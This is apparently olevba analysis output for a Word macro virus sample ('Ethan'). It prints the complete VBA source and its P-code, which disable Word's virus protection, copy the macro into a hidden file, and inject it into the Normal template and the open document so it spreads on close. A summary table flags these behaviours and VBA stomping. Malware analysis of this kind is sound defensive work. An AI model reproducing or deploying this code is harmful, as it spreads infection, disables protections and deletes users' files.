olevba 0.60.1.dev3 on Python 3.8.10 - http://decalage.info/python/oletools
===============================================================================
FILE: Virus.MSWord.Ethan.cj
Type: OLE
-------------------------------------------------------------------------------
VBA MACRO ThisDocument.cls 
in file: Virus.MSWord.Ethan.cj - OLE stream: 'Macros/VBA/ThisDocument'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
Private Sub Document_Close()
On Error Resume Next

Dim KillName$
KillName$ = "C:\class.sys"
If Dir(KillName) <> "" Then Kill KillName
If Dir("c:\Brigl.sys") <> "" Then Kill "c:\class.sys"

s = ActiveDocument.Saved
Application.EnableCancelKey = Not -1
With Options: .ConfirmConversions = 0: .VirusProtection = 0: .SaveNormalPrompt = 0: End With

Randomize
If Dir("c:\_____.___", 6) = "" Then
    Open "c:\_____.___" For Output As #1
    For i = 1 To MacroContainer.VBProject.VBComponents.Item(1).CodeModule.CountOfLines
    a = MacroContainer.VBProject.VBComponents.Item(1).CodeModule.Lines(i, 1)
    Print #1, a
    Next i
    Close #1
    SetAttr "c:\_____.___", 6
End If

If NormalTemplate.VBProject.VBComponents.Item(1).CodeModule.Lines(1, 1) <> "Private Sub Document_Close()" Then
    Set t = NormalTemplate.VBProject.VBComponents.Item(1)
ElseIf ActiveDocument.VBProject.VBComponents.Item(1).CodeModule.Lines(1, 1) <> "Private Sub Document_Close()" Then
    Set t = ActiveDocument.VBProject.VBComponents.Item(1)
Else
    t = ""
End If

If t <> "" Then
    Open "c:\_____.___" For Input As #1
    If LOF(1) = 0 Then GoTo q
    i = 1
    Do While Not EOF(1)
        Line Input #1, a
        t.CodeModule.InsertLines i, a
        i = i + 1
    Loop
q:
Close #1
If Rnd < 0.3 Then With Dialogs(wdDialogFileSummaryInfo): .Title = "Ethan Frome": .Author = "EW/LN/CB": .Keywords = "Ethan": .Execute: End With
If Left(ActiveDocument.Name, 8) <> "Document" Then ActiveDocument.SaveAs FileName:=ActiveDocument.FullName
End If
If ActiveDocument.Saved <> s Then ActiveDocument.Saved = s
End Sub
Private Sub CommandButton1_Click()
On Error Resume Next
If MsgBox("Send form to Personnel?", vbOKCancel, Timesheet) = vbOK Then
    MsgBox "Please remember to type ""Personnel UK"" in the to field of the mail message which will appear next"
    SendForm
ActiveDocument.Close (wdDoNotSaveChanges)
End If
End Sub

Private Sub CommandButton2_Click()
SaveDoc
End Sub

Private Sub Document_New()

End Sub
-------------------------------------------------------------------------------
VBA MACRO VBA_P-code.txt 
in file: VBA P-code - OLE stream: 'VBA P-code'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
' Processing file: Virus.MSWord.Ethan.cj
' ===============================================================================
' Module streams:
' Macros/VBA/ThisDocument - 4439 bytes
' Line #0:
' 	FuncDefn (Private Sub Document_Close())
' Line #1:
' 	OnError (Resume Next) 
' Line #2:
' Line #3:
' 	Dim 
' 	VarDefn KillName
' Line #4:
' 	LitStr 0x000C "C:\class.sys"
' 	St KillName$ 
' Line #5:
' 	Ld KillName 
' 	ArgsLd Dir 0x0001 
' 	LitStr 0x0000 ""
' 	Ne 
' 	If 
' 	BoSImplicit 
' 	Ld KillName 
' 	ArgsCall Kill 0x0001 
' 	EndIf 
' Line #6:
' 	LitStr 0x000C "c:\Brigl.sys"
' 	ArgsLd Dir 0x0001 
' 	LitStr 0x0000 ""
' 	Ne 
' 	If 
' 	BoSImplicit 
' 	LitStr 0x000C "c:\class.sys"
' 	ArgsCall Kill 0x0001 
' 	EndIf 
' Line #7:
' Line #8:
' 	Ld ActiveDocument 
' 	MemLd Saved 
' 	St s 
' Line #9:
' 	LitDI2 0x0001 
' 	UMi 
' 	Not 
' 	Ld Application 
' 	MemSt EnableCancelKey 
' Line #10:
' 	StartWithExpr 
' 	Ld Options 
' 	With 
' 	BoS 0x0000 
' 	LitDI2 0x0000 
' 	MemStWith ConfirmConversions 
' 	BoS 0x0000 
' 	LitDI2 0x0000 
' 	MemStWith VirusProtection 
' 	BoS 0x0000 
' 	LitDI2 0x0000 
' 	MemStWith SaveNormalPrompt 
' 	BoS 0x0000 
' 	EndWith 
' Line #11:
' Line #12:
' 	ArgsCall Read 0x0000 
' Line #13:
' 	LitStr 0x000C "c:\_____.___"
' 	LitDI2 0x0006 
' 	ArgsLd Dir 0x0002 
' 	LitStr 0x0000 ""
' 	Eq 
' 	IfBlock 
' Line #14:
' 	LitStr 0x000C "c:\_____.___"
' 	LitDI2 0x0001 
' 	Sharp 
' 	LitDefault 
' 	Open (For Output)
' Line #15:
' 	StartForVariable 
' 	Ld i 
' 	EndForVariable 
' 	LitDI2 0x0001 
' 	LitDI2 0x0001 
' 	Ld MacroContainer 
' 	MemLd VBProject 
' 	MemLd VBComponents 
' 	ArgsMemLd Item 0x0001 
' 	MemLd CodeModule 
' 	MemLd CountOfLines 
' 	For 
' Line #16:
' 	Ld i 
' 	LitDI2 0x0001 
' 	LitDI2 0x0001 
' 	Ld MacroContainer 
' 	MemLd VBProject 
' 	MemLd VBComponents 
' 	ArgsMemLd Item 0x0001 
' 	MemLd CodeModule 
' 	ArgsMemLd Lines 0x0002 
' 	St a 
' Line #17:
' 	LitDI2 0x0001 
' 	Sharp 
' 	PrintChan 
' 	Ld a 
' 	PrintItemNL 
' Line #18:
' 	StartForVariable 
' 	Ld i 
' 	EndForVariable 
' 	NextVar 
' Line #19:
' 	LitDI2 0x0001 
' 	Sharp 
' 	Close 0x0001 
' Line #20:
' 	LitStr 0x000C "c:\_____.___"
' 	LitDI2 0x0006 
' 	ArgsCall SetAttr 0x0002 
' Line #21:
' 	EndIfBlock 
' Line #22:
' Line #23:
' 	LitDI2 0x0001 
' 	LitDI2 0x0001 
' 	LitDI2 0x0001 
' 	Ld NormalTemplate 
' 	MemLd VBProject 
' 	MemLd VBComponents 
' 	ArgsMemLd Item 0x0001 
' 	MemLd CodeModule 
' 	ArgsMemLd Lines 0x0002 
' 	LitStr 0x001C "Private Sub Document_Close()"
' 	Ne 
' 	IfBlock 
' Line #24:
' 	SetStmt 
' 	LitDI2 0x0001 
' 	Ld NormalTemplate 
' 	MemLd VBProject 
' 	MemLd VBComponents 
' 	ArgsMemLd Item 0x0001 
' 	Set t 
' Line #25:
' 	LitDI2 0x0001 
' 	LitDI2 0x0001 
' 	LitDI2 0x0001 
' 	Ld ActiveDocument 
' 	MemLd VBProject 
' 	MemLd VBComponents 
' 	ArgsMemLd Item 0x0001 
' 	MemLd CodeModule 
' 	ArgsMemLd Lines 0x0002 
' 	LitStr 0x001C "Private Sub Document_Close()"
' 	Ne 
' 	ElseIfBlock 
' Line #26:
' 	SetStmt 
' 	LitDI2 0x0001 
' 	Ld ActiveDocument 
' 	MemLd VBProject 
' 	MemLd VBComponents 
' 	ArgsMemLd Item 0x0001 
' 	Set t 
' Line #27:
' 	ElseBlock 
' Line #28:
' 	LitStr 0x0000 ""
' 	St t 
' Line #29:
' 	EndIfBlock 
' Line #30:
' Line #31:
' 	Ld t 
' 	LitStr 0x0000 ""
' 	Ne 
' 	IfBlock 
' Line #32:
' 	LitStr 0x000C "c:\_____.___"
' 	LitDI2 0x0001 
' 	Sharp 
' 	LitDefault 
' 	Open (For Input)
' Line #33:
' 	LitDI2 0x0001 
' 	ArgsLd LOF 0x0001 
' 	LitDI2 0x0000 
' 	Eq 
' 	If 
' 	BoSImplicit 
' 	GoTo q 
' 	EndIf 
' Line #34:
' 	LitDI2 0x0001 
' 	St i 
' Line #35:
' 	LitDI2 0x0001 
' 	ArgsLd EOF 0x0001 
' 	Not 
' 	DoWhile 
' Line #36:
' 	LitDI2 0x0001 
' 	Ld a 
' 	LineInput 
' Line #37:
' 	Ld i 
' 	Ld a 
' 	Ld t 
' 	MemLd CodeModule 
' 	ArgsMemCall InsertLines 0x0002 
' Line #38:
' 	Ld i 
' 	LitDI2 0x0001 
' 	Add 
' 	St i 
' Line #39:
' 	Loop 
' Line #40:
' 	Label q 
' Line #41:
' 	LitDI2 0x0001 
' 	Sharp 
' 	Close 0x0001 
' Line #42:
' 	Ld Rnd 
' 	LitR8 0x3333 0x3333 0x3333 0x3FD3 
' 	Lt 
' 	If 
' 	BoSImplicit 
' 	StartWithExpr 
' 	Ld wdDialogFileSummaryInfo 
' 	ArgsLd Dialogs 0x0001 
' 	With 
' 	BoS 0x0000 
' 	LitStr 0x000B "Ethan Frome"
' 	MemStWith Title 
' 	BoS 0x0000 
' 	LitStr 0x0008 "EW/LN/CB"
' 	MemStWith Author 
' 	BoS 0x0000 
' 	LitStr 0x0005 "Ethan"
' 	MemStWith Keywords 
' 	BoS 0x0000 
' 	ArgsMemCallWith Execute 0x0000 
' 	BoS 0x0000 
' 	EndWith 
' 	EndIf 
' Line #43:
' 	Ld ActiveDocument 
' 	MemLd New 
' 	LitDI2 0x0008 
' 	ArgsLd LBound 0x0002 
' 	LitStr 0x0008 "Document"
' 	Ne 
' 	If 
' 	BoSImplicit 
' 	Ld ActiveDocument 
' 	MemLd FullName 
' 	ParamNamed FileName 
' 	Ld ActiveDocument 
' 	ArgsMemCall SaveAs 0x0001 
' 	EndIf 
' Line #44:
' 	EndIfBlock 
' Line #45:
' 	Ld ActiveDocument 
' 	MemLd Saved 
' 	Ld s 
' 	Ne 
' 	If 
' 	BoSImplicit 
' 	Ld s 
' 	Ld ActiveDocument 
' 	MemSt Saved 
' 	EndIf 
' Line #46:
' 	EndSub 
' Line #47:
' 	FuncDefn (Private Sub CommandButton1_Click())
' Line #48:
' 	OnError (Resume Next) 
' Line #49:
' 	LitStr 0x0017 "Send form to Personnel?"
' 	Ld vbOKCancel 
' 	Ld Timesheet 
' 	ArgsLd MsgBox 0x0003 
' 	Ld vbOK 
' 	Eq 
' 	IfBlock 
' Line #50:
' 	LitStr 0x0061 "Please remember to type "Personnel UK" in the to field of the mail message which will appear next"
' 	ArgsCall MsgBox 0x0001 
' Line #51:
' 	ArgsCall SendForm 0x0000 
' Line #52:
' 	Ld wdDoNotSaveChanges 
' 	Paren 
' 	Ld ActiveDocument 
' 	ArgsMemCall Close 0x0001 
' Line #53:
' 	EndIfBlock 
' Line #54:
' 	EndSub 
' Line #55:
' Line #56:
' 	FuncDefn (Private Sub CommandButton2_Click())
' Line #57:
' 	ArgsCall SaveDoc 0x0000 
' Line #58:
' 	EndSub 
' Line #59:
' Line #60:
' 	FuncDefn (Private Sub Document_New())
' Line #61:
' Line #62:
' 	EndSub 
+----------+--------------------+---------------------------------------------+
|Type      |Keyword             |Description                                  |
+----------+--------------------+---------------------------------------------+
|AutoExec  |Document_Close      |Runs when the Word document is closed        |
|AutoExec  |Document_New        |Runs when a new Word document is created     |
|AutoExec  |CommandButton1_Click|Runs when the file is opened and ActiveX     |
|          |                    |objects trigger events                       |
|Suspicious|Open                |May open a file                              |
|Suspicious|Output              |May write to a file (if combined with Open)  |
|Suspicious|Print #             |May write to a file (if combined with Open)  |
|Suspicious|Kill                |May delete a file                            |
|Suspicious|VBProject           |May attempt to modify the VBA code (self-    |
|          |                    |modification)                                |
|Suspicious|VBComponents        |May attempt to modify the VBA code (self-    |
|          |                    |modification)                                |
|Suspicious|CodeModule          |May attempt to modify the VBA code (self-    |
|          |                    |modification)                                |
|Suspicious|Base64 Strings      |Base64-encoded strings were detected, may be |
|          |                    |used to obfuscate strings (option --decode to|
|          |                    |see all)                                     |
|Suspicious|VBA Stomping        |VBA Stomping was detected: the VBA source    |
|          |                    |code and P-code are different, this may have |
|          |                    |been used to hide malicious code             |
+----------+--------------------+---------------------------------------------+
VBA Stomping detection is experimental: please report any false positive/negative at https://github.com/decalage2/oletools/issues

